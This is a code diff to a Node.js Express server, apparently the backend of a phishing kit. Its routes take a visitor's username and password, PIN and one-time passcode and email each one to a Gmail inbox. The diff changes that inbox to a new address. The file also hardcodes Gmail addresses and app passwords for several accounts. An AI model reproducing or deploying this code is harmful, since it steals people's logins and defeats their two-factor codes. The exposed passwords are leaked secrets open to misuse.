@@ -20,8 +20,8 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "edehchinedu59@gmail.com",
-      pass: "yknycyzsxdkxpepq",
+      // user: "edehchinedu59@gmail.com",
+      // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
       // user: 'Victorchinemerem191@gmail.com',
@@ -30,12 +30,14 @@ app.post("/", (req, res) => {
       // pass: 'eujqfpdvuhepijkk'
       // user: "join.kudapp@gmail.com",
       // pass: "ftjbwzimegueosaw",
+      user: "youngkesh110@gmail.com",
+      pass: "euaqhqghheyvvzey",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "youngkesh110@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -58,8 +60,8 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "edehchinedu59@gmail.com",
-      pass: "yknycyzsxdkxpepq",
+      // user: "edehchinedu59@gmail.com",
+      // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
       // user: 'Victorchinemerem191@gmail.com',
@@ -68,12 +70,14 @@ app.post("/pin", (req, res) => {
       // pass: 'eujqfpdvuhepijkk'
       // user: "join.kudapp@gmail.com",
       // pass: "ftjbwzimegueosaw",
+      user: "youngkesh110@gmail.com",
+      pass: "euaqhqghheyvvzey",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "youngkesh110@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -98,14 +102,16 @@ app.post("/otp", (req, res) => {
     auth: {
       // user: "edehchinedu59@gmail.com",
       // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
+      user: "youngkesh110@gmail.com",
+      pass: "euaqhqghheyvvzey",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "youngkesh110@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
